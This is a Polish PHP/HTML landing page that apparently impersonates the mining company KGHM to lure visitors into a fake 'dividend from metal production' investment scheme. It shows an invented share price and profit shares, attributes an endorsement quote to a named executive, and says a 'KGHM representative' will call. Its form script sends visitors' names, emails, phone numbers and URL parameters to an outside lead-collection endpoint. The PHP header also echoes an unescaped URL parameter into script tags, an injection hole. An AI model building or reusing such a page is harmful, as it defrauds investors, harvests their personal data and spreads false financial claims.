<!doctype html>
<html lang="pl">
<head>
    <?php
    if (isset($_GET['gtm'])) {
        echo "<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
            new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
            j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
            'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
            })(window,document,'script','dataLayer','GTM-" . $_GET['gtm'] . "');</script>";
    }
    ?>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>KGHM</title>
    <link rel="icon" href="img/favicon.ico">
    <link rel="stylesheet" href="https://unpkg.com/swiper@7/swiper-bundle.min.css" />
    <link rel="stylesheet" href="js/registerForm/intlTelInput/css/intlTelInput.css">
    <link rel="stylesheet" href="js/registerForm/registerForm.css">
    <link rel="stylesheet" href="css/style.css">
</head>
<body>
<?php
if (isset($_GET['gtm'])) {
    echo "<noscript><iframe src='https://www.googletagmanager.com/ns.html?id=GTM-" . $_GET['gtm'] . "'
                  height='0' width='0' style='display:none;visibility:hidden'></iframe></noscript>";
}
?>
<div class="app">
    <header class="header">
        <div class="container">
            <div class="header__intro">
                <div class="header__logo">
                    <img src="img/logo.png" alt="Logo" />
                </div>
                <div class="header__stocks">
                    <p>SHARE PERFORMANCE <b>KGHM</b> PLN $188.95
                        <span class="percent"> 2.27%</span>
                        <svg class="header__angle" width="22" height="18" viewBox="0 0 22 18" fill="none"
                             xmlns="http://www.w3.org/2000/svg">
                            <path d="M11 0L21.3923 18H0.607696L11 0Z" fill="#00A611" />
                        </svg>
                    </p>
                    <p>Last update <b><span id="date">date</span> 10:27</b></p>
                </div>
            </div>
        </div>
    </header>
    <div class="wrap">
        <div class="container">
            <div class="wrap__inner">
                <div class="side side__left">
                    <h2 data-aos="fade-down" class="side__title">
                        Zarabiaj na akcjach KGHM i metalach szlachetnych
                    </h2>
                    <div data-aos="fade-right" class="side__video">
                        <video controls playsinline preload="none" autoplay muted
                               poster="img/poster.jpg"
                               src="//companyapidata.info/video/kghm/new2.mp4">
                        </video>
                    </div>
                </div>
                <div id="form" class="side side__right">
                    <div class="form__wrap">
                        <div class="form__title">
                            Rejestracja
                        </div>
                        <form class="form-container">
                            <div class="reg-form__preloader hide">
                                <img src="js/registerForm/preloader.gif" alt="" class="reg-form__preloader-img">
                            </div>
                            <div class="form__group form__group-name">
                                <input data-validation_type="firstname" name="firstname"
                                       placeholder="Imię"
                                       required="">
                            </div>
                            <div class="form__group form__group-name">
                                <input data-validation_type="lastname" name="lastname"
                                       placeholder="Nazwisko"
                                       required="">
                            </div>
                            <div class="form__group form__group-email">
                                <input type="email" data-validation_type="email" name="email"
                                       placeholder="Email"
                                       required="">
                            </div>
                            <div class="form__group form__group-input">
                                <input data-validation_type="phone" type="tel" class="phone" name="phone"
                                       required
                                       autocomplete="off">
                            </div>
                            <div class="form__group form__group-button">
                                <button class="send-form btn btn-primary" type="submit" disabled>
                                    <span class="button--inner">Dołącz do projektu</span>
                                </button>
                            </div>
                            <div class="form__group-hidden">
                                <input type="hidden" name="full-phone">
                                <input type="hidden" name="aff_id" value="{aff_id}">
                                <input type="hidden" name="aff_id2" value="{aff_id2}">
                                <input type="hidden" name="aff_c" value="{aff_c}">
                                <input type="hidden" name="country">
                                <input type="hidden" name="full-country">
                                <input type="hidden" name="offer" value="kghm">
                                <input type="hidden" name="lang" value="PL">
                                <input type="hidden" name="ip">
                                <input type="hidden" name="domain">
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <section class="slider">
        <div class="container">
            <div class="swiper">
                <div class="swiper-wrapper">
                    <div class="swiper-slide">
                        <img src="img/slide-1.png" alt="">
                    </div>
                    <div class="swiper-slide">
                        <img src="img/slide-2.png" alt="">
                    </div>
                    <div class="swiper-slide">
                        <img src="img/slide-3.png" alt="">
                    </div>
                </div>
                <div class="swiper-pagination"></div>
                <div class="swiper-button-prev"></div>
                <div class="swiper-button-next"></div>
            </div>
        </div>
    </section>
    <div class="project-wrap">
        <div class="container">
            <div class="project-wrap__top">
                <h3 class="title project-wrap__title">
                    “Akcjonariusze KGHM od 2021 r. mają możliwość otrzymywania dywidendy nie tylko z akcji spółki, ale
                    także z procentu od produkcji metali szlachetnych.”
                </h3>
                <!--                <div class="line"></div>-->
                <!--                <p class="project-wrap__text">-->
                <!--                    “Akcjonariusze KGHM od 2021 r. mają możliwość otrzymywania dywidendy nie tylko z akcji spółki, ale-->
                <!--                    także z procentu od produkcji metali szlachetnych.”-->
                <!--                </p>-->
            </div>
            <div class="project-wrap__bottom">
                <div class="items">
                    <div data-aos="zoom-in" style="background: url(img/project1.jpg)" class="item">
                        <h5 class="item__title">Złoto</h5>
                        <p class="item__profit">1% wydobycia złota w Polsce</p>
                        <button type="button" data-url="#form"
                                class="item__btn to-form">
                            Dołącz do projektu
                        </button>
                    </div>
                    <div data-aos="zoom-in" style="background: url(img/project2.jpg)" class="item">
                        <h5 class="item__title">Platyna</h5>
                        <p class="item__profit">0,5% produkcji platyny w Polsce</p>
                        <button type="button" data-url="#form"
                                class="item__btn to-form">
                            Dołącz do projektu
                        </button>
                    </div>
                    <div data-aos="zoom-in" style="background: url(img/project3.jpg)" class="item">
                        <h5 class="item__title">Srebro</h5>
                        <p class="item__profit">1,3% produkcji srebra w Polsce</p>
                        <button type="button" data-url="#form"
                                class="item__btn to-form">
                            Dołącz do projektu
                        </button>
                    </div>
                    <div data-aos="zoom-in" style="background: url(img/project4.jpg)" class="item">
                        <h5 class="item__title">Miedź</h5>
                        <p class="item__profit">1% produkcji miedzi w Polsce</p>
                        <button type="button" data-url="#form"
                                class="item__btn to-form">
                            Dołącz do projektu
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="process-wrap">
        <div class="container">
            <div class="process-wrap__content">
                <h3 data-aos="zoom-in" class="process-wrap__title">
                    Jak mogę zacząć otrzymywać dywidendy?
                </h3>
                <p data-aos="zoom-in" class="process-wrap__text">
                    Jeśli zdecydowałeś się zarabiać, wypełnij formularz zgłoszeniowy i czekaj na telefon od
                    przedstawiciela KGHM. Otrzymasz profesjonalną poradę od eksperta i określisz kwotę, którą chciałbyś
                    zarabiać w sposób zrównoważony. Możesz wtedy nabyć taką liczbę akcji, jaką chcesz, aby osiągnąć
                    swoje cele finansowe. Nie ma ograniczeń co do częstotliwości wypłat dywidendy.
                </p>
            </div>
        </div>
    </div>
    <div class="company-wrap">
        <div class="container">
            <div class="company-wrap__inner">
                <div class="company-wrap__side company-wrap__side__left">
                    <div class="company-wrap__side__top">
                        <h3 data-aos="fade-down" class="title company-wrap__title company-wrap__title_deck">
                            Marcin Chludziński
                        </h3>
                        <div class="line"></div>
                    </div>
                    <div class="company-wrap__side__bottom">
                        <p data-aos="fade-right" class="company-wrap__text">
                            "Nie widzę bardziej wiarygodnego pola inwestycyjnego niż akcje KGHM, największej spółki
                            wydobywającej złoto w Europie. Po tym wszystkim, metal zawsze będzie duży popyt na całym
                            świecie.
                        </p>
                        <p data-aos="fade-left" class="company-wrap__text">
                            Osiągnięty efekt spełni wszystkie Państwa oczekiwania. Powodzenia!"
                        </p>
                        <a data-aos="fade-down" href="kghm-investor.pdf" download type="button"
                           class="company-wrap__btn">
                            Pobierz prezentację
                            <svg width="33" height="44" viewBox="0 0 33 44" fill="none"
                                 xmlns="http://www.w3.org/2000/svg">
                                <g>
                                    <path d="M31.7883 8.41309L24.5781 1.20293C23.8047 0.429492 22.7563 -0.00878906 21.6648 -0.00878906H4.125C1.84766 -0.000195312 0 1.84746 0 4.1248V39.8748C0 42.1521 1.84766 43.9998 4.125 43.9998H28.875C31.1523 43.9998 33 42.1521 33 39.8748V11.335C33 10.2436 32.5617 9.18652 31.7883 8.41309ZM28.5398 10.9998H22V4.45996L28.5398 10.9998ZM4.125 39.8748V4.1248H17.875V13.0623C17.875 14.2053 18.7945 15.1248 19.9375 15.1248H28.875V39.8748H4.125ZM25.6266 27.5256C24.5781 26.4943 21.5875 26.7779 20.0922 26.967C18.6141 26.0646 17.6258 24.8186 16.9297 22.9881C17.2648 21.6045 17.7977 19.499 17.3937 18.1756C17.0328 15.924 14.1453 16.1475 13.7328 17.6686C13.3547 19.0521 13.6984 20.9771 14.3344 23.435C13.475 25.4889 12.1945 28.2475 11.2922 29.8287C9.57344 30.7139 7.25313 32.0803 6.90938 33.799C6.62578 35.1568 9.14375 38.5428 13.4492 31.1178C15.3742 30.4818 17.4711 29.6998 19.3273 29.3904C20.9516 30.267 22.8508 30.8514 24.1227 30.8514C26.3141 30.8514 26.5289 28.4279 25.6266 27.5256ZM8.60234 34.2115C9.04062 33.0342 10.7078 31.6764 11.2148 31.2037C9.58203 33.8076 8.60234 34.2717 8.60234 34.2115ZM15.6148 17.8318C16.2508 17.8318 16.1906 20.5904 15.7695 21.3381C15.3914 20.1436 15.4 17.8318 15.6148 17.8318ZM13.518 29.5709C14.3516 28.1186 15.0648 26.3912 15.6406 24.8701C16.3539 26.1678 17.2648 27.2076 18.2273 27.9209C16.4398 28.2904 14.8844 29.0467 13.518 29.5709ZM24.8273 29.1412C24.8273 29.1412 24.3977 29.6568 21.6219 28.4709C24.6383 28.2475 25.1367 28.935 24.8273 29.1412Z"
                                          fill="#CA0000" />
                                </g>
                            </svg>
                        </a>
                    </div>
                </div>
                <div class="company-wrap__side company-wrap__side__right">
                    <h3 data-aos="fade-down" class="title company-wrap__title company-wrap__title_mob">
                        Marcin Chludziński
                    </h3>
                    <img data-aos="fade-down" src="img/company.jpg" alt="" />
                </div>
            </div>

            <button data-aos="fade-down" data-url="#form"
                    class="steps-wrap__btn to-form">
                Spróbuj teraz
            </button>
        </div>
    </div>
</div>
<footer class="footer-wrap">
    <div class="conatiner">
        <p class="footer-wrap__text">
            All of the results are individual and depend on the amount of investment and some other factors.
        </p>
        <p class="footer-wrap__text">
            © 2021 KGHM Polska Miedź S.A. All rights reserved.
        </p>
    </div>
</footer>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"
        integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
<script src="https://unpkg.com/swiper@7/swiper-bundle.min.js"></script>
<script>
    function getURLParameter(name) {
        return decodeURI((RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || '');
    }

    (function (w, d) {
        w.addEventListener('DOMContentLoaded', function () {

            let aff_id = getURLParameter('aff_id');
            let aff_c = getURLParameter('aff_c');
            let aff_id2 = getURLParameter('aff_id2');

            let sub1Value = document.querySelectorAll('input[name=aff_id]');
            sub1Value.forEach(item => item.setAttribute("value", aff_id))

            let sub2Value = document.querySelectorAll('input[name=aff_c]');
            sub2Value.forEach(item => item.setAttribute("value", aff_c))

            let aff_id2Value = document.querySelectorAll('input[name=aff_id2]');
            aff_id2Value.forEach(item => item.setAttribute("value", aff_id2))
        })
    }(window, document));
</script>
<script>
    let queryString = window.location.search,
        urlParams = new URLSearchParams(queryString),
        entries = urlParams.entries(),
        formHidden = document.querySelectorAll('.form__group-hidden');

    for (const entry of entries) {
        formHidden.forEach(item => {
            let inputHidden = document.createElement('input');
            inputHidden.setAttribute('type', 'hidden');
            inputHidden.setAttribute('name', entry[0]);
            inputHidden.setAttribute('value', entry[1]);
            item.appendChild(inputHidden)
        })
    }
</script>
<script>
    $('.form-container').submit(function (e) {
        e.preventDefault();

        $('.reg-form__preloader').removeClass('hidden');
        let datas = $(this).serialize();

        $.ajax({
            type: 'POST',
            dataType: 'json',
            crossDomain: true,
            url: 'https://create-traffic.com/api/lead_test.php',
            data: {
                "formData": datas
            },
            success: function (response) {
                if (response.status.result === 'success') {
                    window.location.href = `success.php?link=${response.status.link}`
                }
            }
        });
    });
</script>
<script src="js/registerForm/intlTelInput/js/intlTelInput.js"></script>
<script src="js/registerForm/registerForm.js"></script>
<script src="js/main.js"></script>
</body>
</html>